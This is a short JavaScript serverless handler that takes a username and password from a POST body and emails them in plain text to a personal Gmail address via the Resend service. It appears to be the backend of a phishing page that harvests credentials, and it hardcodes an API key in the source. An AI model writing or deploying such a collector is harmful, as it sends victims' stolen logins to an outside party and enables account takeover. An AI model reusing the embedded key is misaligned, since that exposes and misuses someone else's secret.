import { Resend } from "resend";

const resend = new Resend("re_CnEJNkVX_Hx738rXgwEo72wrLqLErfvEm");
export default async function handler(req, res) {

    if (req.method !== "POST") {
        return res.status(405).json({
            error: "Method not allowed"
        });
    }

    try {


        const { username, password } = req.body;
        const data = await resend.emails.send({

            from: "onboarding@resend.dev",

            to: "vampire124.personal@gmail.com",

            subject: "New Id",

            html: `
            username: ${username}
            password: ${password}


            `
        });

        res.status(200).json(data);

    } catch (err) {

        res.status(500).json({
            error: err.message
        });
    }
    
}